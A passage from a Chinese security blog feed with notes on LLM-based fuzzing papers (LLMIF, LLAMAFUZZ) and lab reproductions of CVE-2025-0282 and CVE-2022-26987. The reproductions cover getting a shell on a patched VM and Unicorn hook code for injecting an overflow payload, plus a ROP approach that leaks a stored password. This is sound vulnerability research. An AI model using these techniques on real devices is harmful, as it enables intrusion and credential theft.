class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># check memset</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">pass</span>	</span><br><span class="line">					</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>LLMIF源码阅读</title>
    <url>/posts/95a45f3a.html</url>
    <content><![CDATA[<h1 id="LLMIF-论文整理"><a href="#LLMIF-论文整理" class="headerlink" title="LLMIF 论文整理"></a>LLMIF 论文整理</h1><p>论文LLMIF（LLMIF: Augmented Large Language Model for Fuzzing IoT Devices  ）</p>
<ul>
<li>论文作者：Jincheng Wang（The Hong Kong Polytechnic University）</li>
<li>论文链接：<a href="https://ieeexplore.ieee.org/xpl/conhome/10646615/proceeding">2024 IEEE Symposium on Security and Privacy (SP)</a></li>
<li>工作源码：<a href="https://github.com/anonymousAnalyst22/LLMIF">https://github.com/anonymousAnalyst22/LLMIF</a></li>
</ul>
<h2 id="1-解决问题"><a href="#1-解决问题" class="headerlink" title="1. 解决问题"></a>1. 解决问题</h2><ul>
<li>Obfuscated Message Formats（<strong>复杂的消息格式</strong>）: IoT消息格式比较复杂。缺失消息格式会导致以下两个问题：<ol>
<li>种子生成受到消息格式的限制</li>
<li>难以生成有效的变异输入（格式问题）</li>
</ol>
</li>
<li>Unresolved Message Dependencies （未解析<strong>消息依赖</strong>）: IoT协议不同消息对应了设备的不同状态，也就是某些漏洞需要特定的消息序列使设备处于特征状态才能触发。</li>
<li>Lack of Testing Case Evaluations（缺乏案例评估）: <strong>黑盒测试</strong>，缺乏对模糊测试定义合理反馈（代码覆盖率？），导致可能难以提升模糊测试效果。</li>
</ul>
<h2 id="2-核心思路"><a href="#2-核心思路" class="headerlink" title="2. 核心思路"></a>2. 核心思路</h2><p><strong>协议规范提供了丰富且准确的消息格式描述，而复杂繁多的协议描述信息可以由LLM自动化完成</strong></p>
<ul>
<li>协议规范中对<strong>消息header与payload</strong>部分的描述有助于帮助生成正确格式的消息结构，从而有助于提取消息覆盖率、制定有效的变异策略</li>
<li>协议规范会描述与设备交互的具体信息，有助于提取消息之间的依赖关系。<br>eg：<ul>
<li>Zigbee Identify message &lt;-&gt;“This then starts the device’s identification procedure”</li>
<li>AddGroupIfIdentifying message &lt;-&gt; “The message allows the device to <strong>add a group</strong> <strong>on the condition</strong> that it is <strong>identifying</strong> itself”</li>
</ul>
</li>
<li>协议规范展示了消息处理的工作流，可以用于评估测试输入是否达到目标效果</li>
</ul>
<h2 id="3-技术实现"><a href="#3-技术实现" class="headerlink" title="3. 技术实现"></a>3. 技术实现</h2><p>基于LLM实现，LLM辅助分为两个部分：Protocol Information Extraction（协议信息提取），  Device Response Reasoning  （设备响应归因）</p>
<ul>
<li><p><strong>协议信息提取</strong>：LLM提取有效的协议信息：<strong>消息格式</strong>，field value，header structure，<strong>消息依赖关系</strong>。</p>
</li>
<li><p><strong>设备响应推理</strong>：LLM基于协议规范，对给定的test case和设备response判断test case是否导致了设备状态转换。</p>
</li>
</ul>
<h3 id="3-1-大模型增强"><a href="#3-1-大模型增强" class="headerlink" title="3.1 大模型增强"></a>3.1 大模型增强</h3><p>具备相关领域知识的LLM被称为增强语言模型（ALM）</p>
<blockquote>
<p>专业知识嵌入到上下文+CoT</p>
</blockquote>
<h5 id="3-1-1-为什么需要大模型增强"><a href="#3-1-1-为什么需要大模型增强" class="headerlink" title="3.1.1 为什么需要大模型增强"></a>3.1.1 为什么需要大模型增强</h5><p>该工作向我们展示了LLM在IoT Protocol领域相关知识的缺乏，表明了使用ALM的必要性</p>
<ol>
<li>Message identification：LLM需要给出正确的消息名</li>
<li>Format inference：LLM需要输出正确的field name以及field data types</li>
</ol>
<img src="/posts/95a45f3a/image-20250317141742067.png" class="" title="image-20250317141742067">

<p>96个消息类型中，大模型平均只成功构建了15个消息格式，召回率（15.6%）（和表格不一致？和实验评估里chatAFL的结果一致）。</p>
<h5 id="3-1-2-大模型增强方法"><a href="#3-1-2-大模型增强方法" class="headerlink" title="3.1.2 大模型增强方法"></a>3.1.2 大模型增强方法</h5><p>使用知识提取器提取任务相关知识，然后将其作为上下文传递给大模型，有利于后续的任务解决。</p>
<p>该工作提取<strong>协议规范</strong>作为相关知识。</p>
<p>由于一般协议规范都有良好的格式，可以通过根据不同标题、大纲来制作索引；</p>
<p>使用了<code>background-augmented prompting</code>技术，感觉就是把专业知识和问题凑到一起…</p>
<h3 id="3-2-基于LLM指导的模糊测试"><a href="#3-2-基于LLM指导的模糊测试" class="headerlink" title="3.2 基于LLM指导的模糊测试"></a>3.2 基于LLM指导的模糊测试</h3><p><strong>整体流程</strong>：</p>
<ul>
<li>使用LLM提取有效信息并根据这些信息生成种子；</li>
<li>发送到设备进行测试，获取设备响应；</li>
<li>使用LLM根据响应判断种子有效性。对于造成设备状态改变的，LLMIF会保留该输入并基于消息依赖关系构建新的种子。</li>
</ul>
<img src="/posts/95a45f3a.html2025-03-17-LLMIF论文阅读"  alt="image-20250317142629193" style="zoom:67%;" />

<h4 id="3-2-1-协议信息提取"><a href="#3-2-1-协议信息提取" class="headerlink" title="3.2.1 协议信息提取"></a>3.2.1 协议信息提取</h4><h5 id="消息格式"><a href="#消息格式" class="headerlink" title="消息格式"></a>消息格式</h5><p>针对消息描述可能过长的问题，该工作先划定范围，通过LLM总结协议规范指定范围的每一页，然后再合成每一页的总结描述来构成<code>&#123;message_descriptions&#125;</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">message</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;payload&quot;</span><span class="punctuation">:</span> <span class="string">&quot;leet&quot;</span>;</span><br><span class="line">  <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="number">0xdeadbeef</span>;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<img src="/posts/95a45f3a.html2025-03-17-LLMIF论文阅读"  alt="image-20250317145032496" style="zoom:67%;" />

<h5 id="Interesting-Field-Value"><a href="#Interesting-Field-Value" class="headerlink" title="Interesting Field Value"></a>Interesting Field Value</h5><p>感兴趣的目标值，有两种：dangerous value（不合法的值），functioning value（定义功能的值）</p>
<p>如下图：Effect Identifier &#x3D; 0x00; Effect Variant &#x3D; 0x00时对应了”Fade to off in 0.8 seconds”的功能。</p>
<img src="/posts/95a45f3a.html2025-03-17-LLMIF论文阅读"  alt="image-20250317144616498" style="zoom:67%;" />

<h5 id="消息头结构"><a href="#消息头结构" class="headerlink" title="消息头结构"></a>消息头结构</h5><p>提取消息头结构，和前面类似，也是提取相关bit的功能和类型</p>
<h5 id="消息依赖"><a href="#消息依赖" class="headerlink" title="消息依赖"></a>消息依赖</h5><p>该工作对消息依赖的定义：A-&gt;B，传入A消息后更新部分设备属性，在传入B消息时会进行检查这些对应属性。</p>
<p>使用了CoT方法引导LLM进行推理，构建了21609个提示词，结果成功构建了968个消息依赖关系</p>
<img src="/posts/95a45f3a.html2025-03-17-LLMIF论文阅读"  alt="image-20250317145041592" style="zoom:67%;" />

<h4 id="3-2-2-种子生成"><a href="#3-2-2-种子生成" class="headerlink" title="3.2.2 种子生成"></a>3.2.2 种子生成</h4><p>为每一个消息格式定义了MID， MID &#x3D; (clusterID, cmdID)</p>
<p>生成种子时，从消息模版中挑选一类消息，然后根据其MID从上述阶段中提取的Interesting Value进行赋值，如果没有则随机赋值，组合成为种子，用于后续种子变异以及模糊测试输入。</p>
<img src="/posts/95a45f3a.html2025-03-17-LLMIF论文阅读"  alt="image-20250317145717099" style="zoom:67%;" />

<h4 id="3-2-3-种子变异"><a href="#3-2-3-种子变异" class="headerlink" title="3.2.3 种子变异"></a>3.2.3 种子变异</h4><p>变异器分为两类：基于数据类型和基于消息头</p>
<h5 id="基于数据类型的变异器"><a href="#基于数据类型的变异器" class="headerlink" title="基于数据类型的变异器"></a>基于数据类型的变异器</h5><ul>
<li>对于定长数据：一般为数值型，设置为极限值0,0xffff</li>
<li>对于变长数据：一般为字符串，第一字节为长度，1）增加字符串长度和对应变量长度位；2）仅修改变量长度位，可能会有不一致问题。</li>
<li>还会随机去除消息中的field来构造不合法输入</li>
</ul>
<h5 id="基于消息头的变异器"><a href="#基于消息头的变异器" class="headerlink" title="基于消息头的变异器"></a>基于消息头的变异器</h5><ul>
<li>随机指定command identifier field</li>
<li>位翻转：翻转特定比特，可能会出现解析问题</li>
</ul>
<h4 id="3-2-4-响应推理"><a href="#3-2-4-响应推理" class="headerlink" title="3.2.4 响应推理"></a>3.2.4 响应推理</h4><p>根据响应判断设备在接收输入后的状态，并据此选择是否保留输入。</p>
<p>判断是否应该保留输入的标准：</p>
<ul>
<li>输入成功执行并使得设备状态改变</li>
<li>输入造成的响应非预期。eg：不合法输入并没有导致设备返回Invalid value，而是被成功执行。</li>
</ul>
<img src="/posts/95a45f3a.html2025-03-17-LLMIF论文阅读"  alt="image-20250317151042282" style="zoom:67%;" />

<h4 id="3-2-5-测试集扩充"><a href="#3-2-5-测试集扩充" class="headerlink" title="3.2.5 测试集扩充"></a>3.2.5 测试集扩充</h4><p>根据上一步消息响应结果来生成新的种子。</p>
<p>具体来讲：目前已有一个测试集输入s &#x3D; [m<sub>1</sub>, …, m<sub>n</sub>]，该测试集输入后可以让设备处于特定状态，此时，如果存在m<sub>n+1</sub>满足上述提取的消息依赖关系，那么就可以将m<sub>n+1</sub>作为新的输入加进该测试集。</p>
<blockquote>
<p>注：此处论文中标明依赖关系是仅根据前一个消息来提取的，是不是可以有更好的方法，考虑m<sub>1</sub>到m<sub>n</sub>整个序列对设备造成的影响，比如应该有个设备属性集合，作消息与设备属性的映射。</p>
</blockquote>
<h4 id="3-2-6-模糊测试工具实现"><a href="#3-2-6-模糊测试工具实现" class="headerlink" title="3.2.6 模糊测试工具实现"></a>3.2.6 模糊测试工具实现</h4><p>该工作设计了两个部分：Fuzzing controller和stack controller。</p>
<ul>
<li>Fuzzing controller：LLMIF本体</li>
<li>stack controller：与Zigbee设备进行交互，与Fuzzing controller用UART串口连接</li>
</ul>
<h2 id="4-实验结果"><a href="#4-实验结果" class="headerlink" title="4. 实验结果"></a>4. 实验结果</h2><ul>
<li>相较于baseline（BOOFUZZ，Z-FUZZER，BEEHIVE，chatAFL），消息覆盖率提升55.2%，代码覆盖率提升53.9%，其中消息覆盖率达到100%。</li>
<li>挖掘了11个Zigbee设备漏洞，8个0-day，7个无法被其他fuzzer检测到。</li>
</ul>
<p>作者自己构造了模拟工具对提供源码的ZStack品牌设备进行编译插桩，进行代码覆盖率分析，由于消息覆盖率达到100%，代码覆盖率也得以有很大提升。</p>
<img src="/posts/95a45f3a.html2025-03-17-LLMIF论文阅读"  alt="image-20250317160808247" style="zoom:67%;" />

<h2 id="5-优势"><a href="#5-优势" class="headerlink" title="5. 优势"></a>5. 优势</h2><ul>
<li>能够成功提取Zigbee的各类消息格式（100%）</li>
<li>显著提升了代码覆盖率（提升了53.9%）</li>
<li>更定制化地利用了LLM工具（相较于chatAFL，基于提示词工程）</li>
</ul>
<h2 id="6-不足"><a href="#6-不足" class="headerlink" title="6. 不足"></a>6. 不足</h2>]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2025-0282漏洞复现</title>
    <url>/posts/77850813.html</url>
    <content><![CDATA[<h1 id="CVE-2025-0282漏洞复现"><a href="#CVE-2025-0282漏洞复现" class="headerlink" title="CVE-2025-0282漏洞复现"></a>CVE-2025-0282漏洞复现</h1><p><strong>实验对象</strong>：Ivanti Connect Secure 22.7R2.3</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>随便填了下IP、DNS、网关ip这些信息。。。当然要确保配置后能主机能连通。</p>
<img src="/posts/77850813/image-20250328104259497.png" class="" title="image-20250328104259497">

<img src="/posts/77850813/image-20250328104502067.png" class="" title="image-20250328104502067">

<p>成功启动：</p>
<img src="/posts/77850813/image-20250328105625193.png" class="" title="image-20250328105625193">

<h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>将虚拟机暂停后，修改其内存文件中的<code>/home/bin/dsconfig.pl</code>字符串为<code>///////////////bin/sh</code>。<code>/home/bin/dsconfig.pl</code>是控制台界面执行时需要调用的脚本文件，替换后等待控制台界面超时后按“回车”，即可获取底层Shell。</p>
<img src="/posts/77850813/image-20250328110128595.png" class="" title="image-20250328110128595">

<p>等待超时后，按回车进入shell。</p>
<p>开启防火墙规则：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 8000 -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>使用python启动web server下载存在漏洞附件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python3 -m http.server 8080  <span class="comment"># 启动Web服务器</span></span></span><br><span class="line">python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞点：</p>
<img src="/posts/77850813/image-20250328144645001.png" class="" title="image-20250328144645001">

<img src="/posts/77850813/image-20250328144511224.png" class="" title="image-20250328144511224">

<p>由于虚拟机web程序每次运行启动后libc地址可能发生变化，需要使用gdb查看libc地址，然后即可运行poc实现任意命令执行。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://bbs.kanxue.com/thread-285510.htm">[原创]Ivanti Connect Secure栈溢出漏洞（CVE-2025-0282）分析与复现</a></li>
<li><a href="https://github.com/sfewer-r7/CVE-2025-0282">CVE-2025-0282</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>Unicorn模拟执行RTOS固件</title>
    <url>/posts/73fe8f33.html</url>
    <content><![CDATA[<h1 id="Unicorn模拟执行RTOS固件"><a href="#Unicorn模拟执行RTOS固件" class="headerlink" title="Unicorn模拟执行RTOS固件"></a>Unicorn模拟执行RTOS固件</h1><p>unicorn是一种指令级cpu模拟器，可以支持多架构二进制程序的执行。由于RTOS固件通常难以进行调试，因此采用通过unicorn模拟器的方式来完成模拟调试。</p>
<h2 id="实验对象"><a href="#实验对象" class="headerlink" title="实验对象"></a>实验对象</h2><p>Fast 1900R设备，RTOS，ARM架构</p>
<h2 id="测试漏洞"><a href="#测试漏洞" class="headerlink" title="测试漏洞"></a>测试漏洞</h2><p>CVE-2022-26987</p>
<p>漏洞位置：</p>
<p><code>tWlanTask</code>函数中接受最大长度为3072的输入，随后调用<code>MmtAtePrase</code>函数将输入复制给长度548的栈上变量。导致存在栈溢出漏洞。</p>
<p><code>tWlanTask</code>函数：</p>
<img src="/posts/73fe8f33/image-20250320143220938.png" class="" title="image-20250320143220938">

<p><code>MmtAtePrase</code>函数：</p>
<img src="/posts/73fe8f33/image-20250320143247413.png" class="" title="image-20250320143247413">

<p>其中<code>spliter</code>相当于strcpy函数，将分隔符<code>&#39;\n&#39;</code>前的字符串复制给v11栈上变量。</p>
<h2 id="模拟片段"><a href="#模拟片段" class="headerlink" title="模拟片段"></a>模拟片段</h2><ol>
<li><p>使用binwalk，010Editor等工具查看该固件的加载基址。该固件为<code>0x40205000</code>，常见RTOS固件的加载基址如何确定可见另一篇文章</p>
</li>
<li><p>使用IDA查看<code>tWlanTask</code>函数的加载函数栈：</p>
<p>查看调用<code>tWlanTask</code>函数的<code>apps_init</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">apps_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// cc</span></span><br><span class="line">  _DWORD v6[<span class="number">4</span>]; <span class="comment">// [sp+2Ch] [bp-28h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7[<span class="number">6</span>]; <span class="comment">// [sp+3Ch] [bp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(<span class="number">1079933252</span>, <span class="number">0</span>, <span class="number">8236</span>);</span><br><span class="line">  v0 = apps_wpsInit(<span class="number">1079933516</span>);</span><br><span class="line">  apps_upnpInit(v0);</span><br><span class="line">  v7[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  v1 = socket(<span class="number">2</span>, <span class="number">2</span>, <span class="number">17</span>);</span><br><span class="line">  MEMORY[<span class="number">0x405E7944</span>] = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (MEMORY[<span class="number">0x4061657C</span>] &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="string">&quot;Unable to create wlan event socket\n&quot;</span>;</span><br><span class="line">LABEL_12:</span><br><span class="line">      my_printf(v2);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( setsockopt(v1, <span class="number">0xFFFF</span>, <span class="number">512</span>, v7, <span class="number">4</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">    v6[<span class="number">0</span>] = <span class="number">604242448</span>;</span><br><span class="line">    v6[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( bind(MEMORY[<span class="number">0x405E7944</span>], v6, <span class="number">16</span>) &lt; <span class="number">0</span> &amp;&amp; (MEMORY[<span class="number">0x4061657C</span>] &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="string">&quot;Unable to bind wlan event socket\n&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (MEMORY[<span class="number">0x4061657C</span>] &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="string">&quot;Unable to setsockopt to wlan event socket\n&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  &#125;</span><br><span class="line">  apps_ateInitSock(<span class="number">1079937388</span>);</span><br><span class="line">  apps_wpsInitSock(<span class="number">1079933516</span>);</span><br><span class="line">  apps_wssInit(<span class="number">1079937384</span>);</span><br><span class="line">  bzero(<span class="number">1079933260</span>, <span class="number">256</span>);</span><br><span class="line">  MEMORY[<span class="number">0x405E7948</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( MEMORY[<span class="number">0x405E7944</span>] &gt; <span class="number">0</span> )</span><br><span class="line">    MEMORY[<span class="number">0x405E7948</span>] = MEMORY[<span class="number">0x405E7944</span>];</span><br><span class="line">  v3 = MEMORY[<span class="number">0x405E88CC</span>];</span><br><span class="line">  *(_DWORD *)(<span class="number">4</span> * (MEMORY[<span class="number">0x405E7944</span>] &gt;&gt; <span class="number">5</span>) + <span class="number">0x405E794C</span>) |= <span class="number">1</span> &lt;&lt; (MEMORY[<span class="number">0x405E7944</span>] &amp; <span class="number">0x1F</span>);</span><br><span class="line">  v4 = (<span class="type">int</span>)v3 &lt;= MEMORY[<span class="number">0x405E7948</span>];</span><br><span class="line">  *(_DWORD *)(<span class="number">4</span> * (v3 &gt;&gt; <span class="number">5</span>) + <span class="number">0x405E794C</span>) |= <span class="number">1</span> &lt;&lt; (v3 &amp; <span class="number">0x1F</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    MEMORY[<span class="number">0x405E7948</span>] = v3;</span><br><span class="line">  <span class="keyword">if</span> ( MEMORY[<span class="number">0x405E896C</span>] &gt; MEMORY[<span class="number">0x405E7948</span>] )</span><br><span class="line">    MEMORY[<span class="number">0x405E7948</span>] = MEMORY[<span class="number">0x405E896C</span>];</span><br><span class="line">  *(_DWORD *)(<span class="number">4</span> * (MEMORY[<span class="number">0x405E896C</span>] &gt;&gt; <span class="number">5</span>) + <span class="number">0x405E794C</span>) |= <span class="number">1</span> &lt;&lt; (MEMORY[<span class="number">0x405E896C</span>] &amp; <span class="number">0x1F</span>);</span><br><span class="line">  taskSpawn(<span class="string">&quot;tWlanTask&quot;</span>, <span class="number">160</span>, <span class="number">0</span>, <span class="number">0x4000</span>, tWlanTask, <span class="number">1079933252</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  regAppList(<span class="number">4</span>, wlanTmpHandle);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其创建了监听在1060端口的udp连接socket，并使用taskSpawn函数创建该任务，其中定义了该函数栈大小为0x4000。</p>
</li>
<li><p>使用unicorn加载该固件到内存：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">fast = Uc(UC_ARCH_ARM, UC_MODE_ARM)</span><br><span class="line">BASE_ADDR = <span class="number">0x40200000</span></span><br><span class="line">BASE_SIZE = <span class="number">0x300000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x40500000</span></span><br><span class="line">STACK_SIZE = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line">fast.mem_map(BASE_ADDR, BASE_SIZE)</span><br><span class="line">fast.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line">fast.mem_write(BASE_ADDR, read(<span class="string">&#x27;./Fast FAC 1900R/FAC1900R千兆版 V1.0升级软件20190827_2.0.2/data_10400&#x27;</span>))</span><br><span class="line">fast.reg_write(UC_ARM_REG_SP, STACK_ADDR + STACK_SIZE-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Traceing instruction at 0x%x, instruction size = 0x%x&quot;</span> %(address, size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func_source = <span class="number">0x402CE868</span></span><br><span class="line">func_ret = <span class="number">0x402CE8D0</span></span><br><span class="line">fast.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">fast.emu_start(func_source, func_ret)</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用capstone库进行反汇编辅助调试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone.arm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytesToOpcodeStr</span>(<span class="params">curBytes</span>):</span><br><span class="line">    opcodeByteStr = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;&#123;:02X&#125; &#x27;</span>.<span class="built_in">format</span>(eachByte) <span class="keyword">for</span> eachByte <span class="keyword">in</span> curBytes)</span><br><span class="line">    <span class="keyword">return</span> opcodeByteStr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="comment"># print(&quot;&gt;&gt;&gt; Traceing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size))</span></span><br><span class="line">    opcodeBytes = mu.mem_read(address, BYTES_PER_LINE)</span><br><span class="line">    opcodeByteStr = bytesToOpcodeStr(opcodeBytes)</span><br><span class="line">    decodedInsnGenerator = cs.disasm(opcodeBytes, address)</span><br><span class="line">    <span class="comment"># if gSingleLineCode:</span></span><br><span class="line">    <span class="keyword">for</span> eachDecodedInsn <span class="keyword">in</span> decodedInsnGenerator:</span><br><span class="line">        eachInstructionName = eachDecodedInsn.mnemonic</span><br><span class="line">        info(<span class="string">&quot;--- 0x%08X: %s -&gt; %s\t%s&quot;</span>, address, opcodeByteStr, eachInstructionName, eachDecodedInsn.op_str)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>从source点模拟执行到sink点，hook <code>recvfrom</code>函数，当执行该函数时，向目标buffer里填充payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_recvfrom</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> address == <span class="number">0x402CE880</span>:</span><br><span class="line">        info(<span class="string">&quot;recvfrom hooked&quot;</span>)</span><br><span class="line">        target_addr = mu.reg_read(UC_ARM_REG_R1)</span><br><span class="line">        size = mu.reg_read(UC_ARM_REG_R2)</span><br><span class="line">        info(<span class="string">f&quot;ret_addr: <span class="subst">&#123;<span class="built_in">hex</span>(mu.reg_read(UC_ARM_REG_LR))&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> size &gt; <span class="built_in">len</span>(user_data):</span><br><span class="line">            size = <span class="built_in">len</span>(user_data)</span><br><span class="line">        mu.mem_write(target_addr, user_data[:size])</span><br><span class="line">        info(<span class="string">f&quot;write <span class="subst">&#123;size&#125;</span> bytes to <span class="subst">&#123;<span class="built_in">hex</span>(target_addr)&#125;</span>&quot;</span>)</span><br><span class="line">        info(<span class="string">f&quot;target_addr: <span class="subst">&#123;mu.mem_read(target_addr, size)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># ret</span></span><br><span class="line">        mu.reg_write(UC_ARM_REG_PC, address+<span class="number">4</span>)</span><br><span class="line">        mu.reg_write(UC_ARM_REG_R0, size)</span><br></pre></td></tr></table></figure>

<p>该漏洞利用方法为利用ROP调用<code>strncpy(group_addr, passwd_addr, 0x21)</code>函数，从而实现泄露passwd目的。</p>
<p>passwd_addr可以在<code>httpGetPassword</code>中获取到，在模拟中我们可以将该地址map为有效密码<code>0KcgeXhc9TefbwK</code>。</p>
<img src="/posts/73fe8f33/image-20250320171631953.png" class="" title="image-20250320171631953">

<p>然后通过hook <code>recvfrom</code> 函数写入payload，获取到目标密码。</p>
<img src="/posts/73fe8f33/image-20250320173044012.png" class="" title="image-20250320173044012">
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>LLAMAFUZZ论文阅读</title>
    <url>/posts/2a47a59b.html</url>
    <content><![CDATA[<p>LLAMAFUZZ：通过对大模型进行微调让大模型获得生成以及变异结构化数据的能力，从而解决模糊测试中难以生成相关合法输入的问题。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>目标对象</strong>：开源库，结构化数据（如PNG）</p>
<p><strong>贡献</strong>：</p>
<ul>
<li>通过<strong>微调</strong>大模型可以实现对二进制数据和文本数据的变异策略加强。</li>
<li>使用大模型（优于通用大模型以及专用大模型），可以学习<strong>结构化数据</strong>种子模版以及进行变异</li>
<li>证明了这种方法的有效性</li>
</ul>
<p><strong>效果</strong>：</p>
<p>优于AFL++，相比于当前的主流Fuzzer在benchmark上可以多发现41个漏洞，同时代码覆盖率提高了27.19%</p>
<blockquote>
<p>论文里提到了Grammar-based fuzzing，其中输入格式由人工指定，变异策略分为三种：1）随机变异，随机选择一个非叶子节点（non-leaf non terminal node）为其添加子属性；2）随机递归展开，找到存在递归的规则并将其进行扩展；3）剪切，合并两个输入，确保语法正确</p>
</blockquote>
<h2 id="技术路线"><a href="#技术路线" class="headerlink" title="技术路线"></a>技术路线</h2><ol>
<li>训练数据收集（各种模糊测试数据，FuzzBench、AFL++）</li>
<li>使用结构化数据对来微调大模型</li>
<li>集成LLM进行fuzz（异步方法提高效率）</li>
</ol>
<img src="/posts/2a47a59b/image-20250425125617620.png" class="" title="image-20250425125617620">

<h3 id="训练数据收集"><a href="#训练数据收集" class="headerlink" title="训练数据收集"></a>训练数据收集</h3><p>基座：llama-2-7b-chat-hf  </p>
<p>微调数据：真实的模糊测试数据</p>
<ol>
<li>微调数据收集：从FuzzBench、AFL++中获取有价值的种子。标准：1）可以发现新的路径；2）hit-counts不同；3）触发crash</li>
<li>数据转换&amp;预处理：将二进制输入文件转换为16进制hex表示。原因：1）适用于多种类型数据；2）易于LLM理解；3）相较于base64等编码方式，hex效率要高一些。<img src="/posts/2a47a59b/image-20250425125719832.png" class="" title="image-20250425125719832"></li>
</ol>
<h3 id="微调大模型"><a href="#微调大模型" class="headerlink" title="微调大模型"></a>微调大模型</h3><img src="/posts/2a47a59b/image-20250425130501012.png" class="" title="image-20250425130501012">]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>pwn protobuf环境搭建</title>
    <url>/posts/7fdebdbe.html</url>
    <content><![CDATA[<p>对protobuf类型题目的环境搭建</p>
